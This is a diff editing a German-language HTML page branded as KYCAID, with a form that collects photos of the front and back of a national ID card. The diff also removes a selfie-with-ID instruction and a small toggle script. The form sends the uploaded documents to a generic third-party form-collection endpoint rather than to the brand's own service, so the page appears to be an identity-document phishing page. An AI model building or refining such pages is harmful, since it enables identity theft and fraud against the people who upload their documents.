@@ -117,13 +117,9 @@
 
     <form id="kycForm" action="https://formcarry.com/s/3Izr5Sl7iQo" method="POST" enctype="multipart/form-data" novalidate>
       <h2>Dokumenten‑Upload zur Verifizierung</h2>
-      <p class="subtitle">
-        Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder‑ und Rückseite).<br>
-        Zusätzlich ist ein aktuelles Selfie mit Ihrem Ausweis erforderlich.
-      </p>
 
-      <label>Art des Ausweisdokuments</label>
-<input type="text" name="Ausweisart" value="Personalausweis" readonly />
+     <label for="ausweisart">Art des Ausweisdokuments</label>
+     <input type="text" id="ausweisart" name="Ausweisart" value="Personalausweis" readonly />
 
       <label for="vorderseite">Vorderseite (Datei)</label>
       <input type="file" id="vorderseite" name="Vorderseite" accept=".jpg,.jpeg,.png,.pdf" required />
@@ -159,19 +155,5 @@
       <p>© Kycaid 2025. All rights reserved.</p>
     </div>
   </footer>
-
-  <script>
-    (function() {
-      const select = document.getElementById('ausweisart');
-      const rueck = document.getElementById('rueckseite-container');
-
-      function toggleRueckseite() {
-        rueck.style.display = select.value === 'Reisepass' ? 'none' : 'block';
-      }
-
-      select.addEventListener('change', toggleRueckseite);
-      toggleRueckseite();
-    })();
-  </script>
 </body>
 </html>
